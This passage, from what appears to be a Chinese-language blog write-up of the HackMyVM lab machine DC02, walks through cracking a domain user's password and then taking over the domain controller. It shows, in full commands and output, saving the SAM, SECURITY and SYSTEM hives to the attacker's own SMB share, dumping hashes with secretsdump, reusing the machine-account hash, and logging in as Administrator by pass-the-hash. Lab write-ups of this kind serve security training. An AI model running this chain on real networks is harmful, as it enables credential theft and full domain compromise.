02:\u003cspan class=\"hljs-number\"\u003e30\u003c/span\u003e:06 \u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e secs)\nKernel.Feature...: Pure Kernel\nGuess.Base.......: File (/usr/share/wordlists/rockyou.txt)\nGuess.Queue......: \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e100.00\u003c/span\u003e%)\nSpeed.\u003cspan class=\"hljs-comment\"\u003e#1.........:    39362 H/s (2.83ms) @ Accel:512 Loops:1 Thr:1 Vec:8\u003c/span\u003e\nRecovered........: \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e100.00\u003c/span\u003e%) Digests (total), \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e100.00\u003c/span\u003e%) Digests (new)\nProgress.........: \u003cspan class=\"hljs-number\"\u003e4096\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e14344385\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.03\u003c/span\u003e%)\nRejected.........: \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e4096\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.00\u003c/span\u003e%)\nRestore.Point....: \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e14344385\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.00\u003c/span\u003e%)\nRestore.Sub.\u003cspan class=\"hljs-comment\"\u003e#1...: Salt:0 Amplifier:0-1 Iteration:0-1\u003c/span\u003e\nCandidate.Engine.: Device Generator\nCandidates.\u003cspan class=\"hljs-comment\"\u003e#1....: 123456 -\u003e oooooo\u003c/span\u003e\nHardware.Mon.\u003cspan class=\"hljs-comment\"\u003e#1..: Util: 15%\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e的到密码 \u003ccode\u003einternet\u003c/code\u003e\u003c/p\u003e\n\u003ch3\u003e再次访问SMB\u003c/h3\u003e\n\u003cp\u003e经测试该用户可以访问其\u003ccode\u003eC\u003c/code\u003e盘\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003esmbclient //\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.126\u003c/span\u003e/C$ -U SOUPEDECODE.LOCAL/zximena448%internet\nTry \u003cspan class=\"hljs-string\"\u003e\"help\"\u003c/span\u003e to get a \u003cspan class=\"hljs-built_in\"\u003elist\u003c/span\u003e of possible commands.\nsmb: \\\u003e ls\n  $WinREAgent                        DH        \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e  Sat Jun \u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e19\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e51\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e\n  Documents \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e Settings          DHSrn        \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e  Sat Jun \u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e51\u003c/span\u003e:08 \u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e\n  DumpStack.log.tmp                 AHS    \u003cspan class=\"hljs-number\"\u003e12288\u003c/span\u003e  Mon Jan \u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e17\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e33\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e\n  pagefile.sys                      AHS \u003cspan class=\"hljs-number\"\u003e1476395008\u003c/span\u003e  Mon Jan \u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e17\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e33\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e\n  PerfLogs                            D        \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e  Sat May  \u003cspan class=\"hljs-number\"\u003e8\u003c/span\u003e 04:\u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e:05 \u003cspan class=\"hljs-number\"\u003e2021\u003c/span\u003e\n  Program Files                      DR        \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e  Sat Jun \u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e54\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e31\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e\n  Program Files (x86)                 D        \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e  Sat May  \u003cspan class=\"hljs-number\"\u003e8\u003c/span\u003e 05:\u003cspan class=\"hljs-number\"\u003e34\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e2021\u003c/span\u003e\n  ProgramData                       DHn        \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e  Sat Jun \u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e51\u003c/span\u003e:08 \u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e\n  Recovery                         DHSn        \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e  Sat Jun \u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e51\u003c/span\u003e:08 \u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e\n  System Volume Information         DHS        \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e  Sat Jun \u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e:02:\u003cspan class=\"hljs-number\"\u003e21\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e\n  Users                              DR        \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e  Mon Jun \u003cspan class=\"hljs-number\"\u003e17\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e31\u003c/span\u003e:08 \u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e\n  Windows                             D        \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e  Sat Jun \u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e21\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e\n\n                \u003cspan class=\"hljs-number\"\u003e12942591\u003c/span\u003e blocks of size \u003cspan class=\"hljs-number\"\u003e4096.\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e10926158\u003c/span\u003e blocks available\nsmb: \\\u003e \n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003eUserFlag\u003c/h3\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003esmb: \\Users\\zximena448\\Desktop\\\u003e get user.txt\ngetting file \\Users\\zximena448\\Desktop\\user.txt of size \u003cspan class=\"hljs-number\"\u003e33\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eas\u003c/span\u003e user.txt (\u003cspan class=\"hljs-number\"\u003e0.8\u003c/span\u003e KiloBytes/sec) (average \u003cspan class=\"hljs-number\"\u003e0.8\u003c/span\u003e KiloBytes/sec)\n\ncat user.txt                             \n2fe79eb0e02ecd4dd2833cfcbbdb504c\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e通过evil-winrm登陆不进去，可能无权限\u003c/p\u003e\n\u003ch3\u003e域内信息收集\u003c/h3\u003e\n\u003cp\u003e通过\u003ccode\u003eLdapDomainDump\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eldapdomaindump SOUPEDECODE.LOCAL -u \u003cspan class=\"hljs-string\"\u003e'SOUPEDECODE.LOCAL\\zximena448'\u003c/span\u003e -p \u003cspan class=\"hljs-string\"\u003e'internet'\u003c/span\u003e\n[*] Connecting to host...\n[*] Binding to host\n[+] Bind OK\n[*] Starting domain dump\n[+] Domain dump finished\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e查看该用户信息，发现是\u003ccode\u003eBackup Operators\u003c/code\u003e 组的用户\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ecat domain_users.grep | grep zximena448\nZach Ximena     Zach Ximena     zximena448      Backup Operators        Domain Users    06/\u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e24\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e:04:\u003cspan class=\"hljs-number\"\u003e37\u003c/span\u003e       01/\u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e25\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e57\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e38\u003c/span\u003e       01/\u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e25\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e23\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e21\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e   NORMAL_ACCOUNT, DONT_EXPIRE_PASSWD, DONT_REQ_PREAUTH     06/\u003cspan class=\"hljs-number\"\u003e17\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e24\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e:09:\u003cspan class=\"hljs-number\"\u003e53\u003c/span\u003e       S-\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e21\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e2986980474\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e46765180\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e2505414164\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e1142\u003c/span\u003e    Volunteer teacher \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e education advocate\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e网上看了关于\u003ccode\u003eBackup Operators\u003c/code\u003e 组，是\u003ccode\u003eWindows\u003c/code\u003e特权组，可以提取主机上的\u003ccode\u003eSAM\u003c/code\u003e，\u003ccode\u003eSECURITY\u003c/code\u003e ，\u003ccode\u003eSYSTEM\u003c/code\u003e等文件\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eBackup Operators组的成员可以备份和恢复计算机上所有的文件，不论保护这些文件的权限是什么。Backup Operators也可以登录和关闭计算机。这个组不能被重命名，删除或者移动。默认情况下，这个内置的组没有成员，可以在域控上执行备份和恢复操作。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e开启SMB服务器\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003esmbserver.py -smb2support \u003cspan class=\"hljs-string\"\u003e\"someshare\"\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"./\"\u003c/span\u003e \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e使用\u003ccode\u003eimpacket\u003c/code\u003e工具集中的\u003ccode\u003ereg\u003c/code\u003e 远程保存\u003ccode\u003eSAM\u003c/code\u003e注册表项\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e **reg.py \u003cspan class=\"hljs-string\"\u003e\"SOUPEDECODE.LOCAL\"\u003c/span\u003e/\u003cspan class=\"hljs-string\"\u003e\"zximena448\"\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e\"internet\"\u003c/span\u003e@\u003cspan class=\"hljs-string\"\u003e\"192.168.56.126\"\u003c/span\u003e save -keyName \u003cspan class=\"hljs-string\"\u003e'HKLM\\SAM'\u003c/span\u003e  -o \u003cspan class=\"hljs-string\"\u003e'\\\\192.168.56.4\\someshare'\u003c/span\u003e\n reg.py \u003cspan class=\"hljs-string\"\u003e\"SOUPEDECODE.LOCAL\"\u003c/span\u003e/\u003cspan class=\"hljs-string\"\u003e\"zximena448\"\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e\"internet\"\u003c/span\u003e@\u003cspan class=\"hljs-string\"\u003e\"192.168.56.126\"\u003c/span\u003e save -keyName \u003cspan class=\"hljs-string\"\u003e'HKLM\\SECURITY'\u003c/span\u003e  -o \u003cspan class=\"hljs-string\"\u003e'\\\\192.168.56.4\\someshare'\u003c/span\u003e\n reg.py \u003cspan class=\"hljs-string\"\u003e\"SOUPEDECODE.LOCAL\"\u003c/span\u003e/\u003cspan class=\"hljs-string\"\u003e\"zximena448\"\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e\"internet\"\u003c/span\u003e@\u003cspan class=\"hljs-string\"\u003e\"192.168.56.126\"\u003c/span\u003e save -keyName \u003cspan class=\"hljs-string\"\u003e'HKLM\\SYSTEM'\u003c/span\u003e  -o \u003cspan class=\"hljs-string\"\u003e'\\\\192.168.56.4\\someshare'\u003c/span\u003e**\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e然后通过\u003ccode\u003esecretsdump.py\u003c/code\u003e 将 \u003ccode\u003eSAM\u003c/code\u003e 和 \u003ccode\u003eSECURITY\u003c/code\u003e转成\u003ccode\u003eHASH\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003esecretsdump.py -sam SAM.save -security SECURITY.save -system SYSTEM.save LOCAL \nImpacket v0\u003cspan class=\"hljs-number\"\u003e.12\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e - Copyright Fortra, LLC \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e its affiliated companies \n\n[*] Target system bootKey: \u003cspan class=\"hljs-number\"\u003e0x0c7ad5e1334e081c4dfecd5d77cc2fc6\u003c/span\u003e\n[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)\nAdministrator:\u003cspan class=\"hljs-number\"\u003e500\u003c/span\u003e:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::\nGuest:\u003cspan class=\"hljs-number\"\u003e501\u003c/span\u003e:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nDefaultAccount:\u003cspan class=\"hljs-number\"\u003e503\u003c/span\u003e:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n[-] SAM hashes extraction \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e user WDAGUtilityAccount failed. The account doesn\u003cspan class=\"hljs-string\"\u003e't have hash information.\n[*] Dumping cached domain logon information (domain/username:hash)\n[*] Dumping LSA Secrets\n[*] $MACHINE.ACC \n$MACHINE.ACC:plain_password_hex:81d6bd9d4f3393bea5ae2b72f672a394eab4830f35c0462e357af7eff5d951ace05b9d7967fcad00bacf6b599e76bbf49ac936c3219241f19c8563f9022d9e02f546dc5c26c03d9e8d1f42ad94fbeecd47efc6a572a94c7b70d437d327790385fe8b0297068c5b7e7140e4b0ab83c27dc5dc9658fe4df7bb7759efb1472b7ccaeb2a73b8341120e730749b5d5b6d6428ea23cae3f9f97e1d29777f63f700da98e68ce8cc2f98b3f5d3f0c0db0ee62c1d1616c4c603764546c658a778cf2f67c9e1c601ee63ee29bfdb5ae6790fcfd013038f1e0ebfaa303aed86e5c2dbf3c62b2aa4099ed6d37aceb9ecdf778af01f80\n$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:159de75b1e7662879be6482554b90e55\n[*] DPAPI_SYSTEM \ndpapi_machinekey:0x829d1c0e3b8fdffdc9c86535eac96158d8841cf4\ndpapi_userkey:0x4813ee82e68a3bf9fec7813e867b42628ccd9503\n[*] NL$KM \n 0000   44 C5 ED CE F5 0E BF 0C  15 63 8B 8D 2F A3 06 8F   D........c../...\n 0010   62 4D CA D9 55 20 44 41  75 55 3E 85 82 06 21 14   bM..U DAuU\u003e...!.\n 0020   8E FA A1 77 0A 9C 0D A4  9A 96 44 7C FC 89 63 91   ...w......D|..c.\n 0030   69 02 53 95 1F ED 0E 77  B5 24 17 BE 6E 80 A9 91   i.S....w.$..n...\nNL$KM:44c5edcef50ebf0c15638b8d2fa3068f624dcad95520444175553e85820621148efaa1770a9c0da49a96447cfc896391690253951fed0e77b52417be6e80a991\n[*] Cleaning up...\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e可以拿到\u003ccode\u003eadministrator\u003c/code\u003e的NTLM\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eAdministrator:\u003cspan class=\"hljs-number\"\u003e500\u003c/span\u003e:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e尝试登录，失败\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ecrackmapexec smb \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.126\u003c/span\u003e -u administrator -H 209c6174da490caeb422f3fa5a7ae634                    \nSMB         \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.126\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e    DC01             [*] Windows Server \u003cspan class=\"hljs-number\"\u003e2022\u003c/span\u003e Build \u003cspan class=\"hljs-number\"\u003e20348\u003c/span\u003e x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:\u003cspan class=\"hljs-literal\"\u003eTrue\u003c/span\u003e) (SMBv1:\u003cspan class=\"hljs-literal\"\u003eFalse\u003c/span\u003e)\nSMB         \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.126\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e    DC01             [-] SOUPEDECODE.LOCAL\\administrator:209c6174da490caeb422f3fa5a7ae634 STATUS_LOGON_FAILURE\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e现在还存在机器账户的hash \u003ccode\u003e$MACHINE.ACC\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:159de75b1e7662879be6482554b90e55\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e枚举看是哪台机子的哈希，得出来是\u003ccode\u003eDC01$\u003c/code\u003e的\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ecrackmapexec smb \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.126\u003c/span\u003e -u username.txt -H 159de75b1e7662879be6482554b90e55\nSMB         \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.126\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e    DC01             [+] SOUPEDECODE.LOCAL\\DC01$:159de75b1e7662879be6482554b90e55\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e得到是\u003ccode\u003eDC01$\u003c/code\u003e的hash后，再次进行\u003ccode\u003esecretsdump.py\u003c/code\u003e 获取\u003ccode\u003eAdministrator\u003c/code\u003e的hash\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003esecretsdump.py soupedecode.local/\u003cspan class=\"hljs-string\"\u003e'DC01$'\u003c/span\u003e@\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.126\u003c/span\u003e -hashes \u003cspan class=\"hljs-string\"\u003e':159de75b1e7662879be6482554b90e55'\u003c/span\u003e | grep \u003cspan class=\"hljs-string\"\u003e\"Administrator\"\u003c/span\u003e\nAdministrator:\u003cspan class=\"hljs-number\"\u003e500\u003c/span\u003e:aad3b435b51404eeaad3b435b51404ee:8982babd4da89d33210779a6c5b078bd:::\nAdministrator:aes256-cts-hmac-sha1-\u003cspan class=\"hljs-number\"\u003e96\u003c/span\u003e:01dc1e0f079f2dfe4a880156b7192acc658b8733cc87f1c5be32c291ad8e0318\nAdministrator:aes128-cts-hmac-sha1-\u003cspan class=\"hljs-number\"\u003e96\u003c/span\u003e:4b4cf4064e92346339b1a3ef3ff65d6b\nAdministrator:des-cbc-md5:b0614357f8160ef4\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003eHASH传递\u003c/h3\u003e\n\u003cp\u003e拿到\u003ccode\u003eadministrator\u003c/code\u003e的\u003ccode\u003eNTLMhash\u003c/code\u003e后就可以进行传递了\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ecrackmapexec smb \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.126\u003c/span\u003e -u Administrator -H 8982babd4da89d33210779a6c5b078bd\nSMB         \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.126\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e    DC01             [*] Windows Server \u003cspan class=\"hljs-number\"\u003e2022\u003c/span\u003e Build \u003cspan class=\"hljs-number\"\u003e20348\u003c/span\u003e x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:\u003cspan class=\"hljs-literal\"\u003eTrue\u003c/span\u003e) (SMBv1:\u003cspan class=\"hljs-literal\"\u003eFalse\u003c/span\u003e)\nSMB         \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.126\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e    DC01             [+] SOUPEDECODE.LOCAL\\Administrator:8982babd4da89d33210779a6c5b078bd (Pwn3d!)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eevil-winrm -i \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.126\u003c/span\u003e -u \u003cspan class=\"hljs-string\"\u003e'administrator'\u003c/span\u003e -H \u003cspan class=\"hljs-string\"\u003e'8982babd4da89d33210779a6c5b078bd'\u003c/span\u003e\n                                        \nEvil-WinRM shell v3\u003cspan class=\"hljs-number\"\u003e.7\u003c/span\u003e\n                                        \nWarning: Remote path completions \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e disabled due to ruby limitation: quoting_detection_proc() function \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e unimplemented on this machine\n                                        \nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm\u003cspan class=\"hljs-comment\"\u003e#Remote-path-completion\u003c/span\u003e\n                                        \nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents\u003e                                   \n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003eRootFlag\u003c/h3\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e*Evil-WinRM* PS C:\\Users\\Administrator\\Desktop\u003e \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e root.txt\nd41d8cd98f00b204e9800998ecf8427e\n\u003c/code\u003e\u003c/pre\u003e","title":"HackMyVM - DC02","date":"2025-04-03","updated":"2025-04-03","comments":true,"tags":["HackMyVM","Linux靶机"],"categories":"靶机","description":"DC02. https://hackmyvm.eu/machines/machine.php?vm=DC02 Notes: Second DC from me. Enjoy it. 信息打点 渗透 SMB 无任何凭据和线索，只能从SMB开始 当头一棒，不能使用匿名帐户，所以LDAP枚举用户也不能成功..."},"recentPosts":[{"id":"TheHackersLabsTHLPWN","title":"TheHackersLabs - THLPWN","date":"2025-10-27","isEncrypted":false,"year":"2025","month":"10","day":"27"},{"id":"念念碎","title":"念念碎","date":"2025-10-26","isEncrypted":false,"year":"2025","month":"10","day":"26"},{"id":"HackTheBoxSeason9 - Conversor","title":"HackTheBox - Season9 - Conversor","date":"2025-10-26","isEncrypted":true,"year":"2025","month":"10","day":"26"},{"id":"HackMyVMSysadmin","title":"HackMyVM - Sysadmin","date":"2025-10-25","isEncrypted":false,"year":"2025","month":"10","day":"25"},{"id":"HackTheBoxSeason8 - Artificial","title":"HackTheBox - Machine - Artificial","date":"2025-06-28","isEncrypted":false,"year":"2025","month":"10","day":"25"},{"id":"HackTheBoxSeason8 - Puppy","title":"HackTheBox - Machine - Puppy","date":"2025-05-19","isEncrypted":false,"year":"2025","month":"10","day":"25"},{"id":"TheHackersLabsAllSafe","title":"TheHackersLabs - AllSafe","date":"2025-10-21","isEncrypted":false,"year":"2025","month":"10","day":"21"}]},"__N_SSG":true},"page":"/[year]/[month]/[day]/[id]","query":{"year":"2025","month":"04","day":"03","id":"HackMyVMDC02"},"buildId":"yBQJLYy5vKYVdUmksNnT4","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>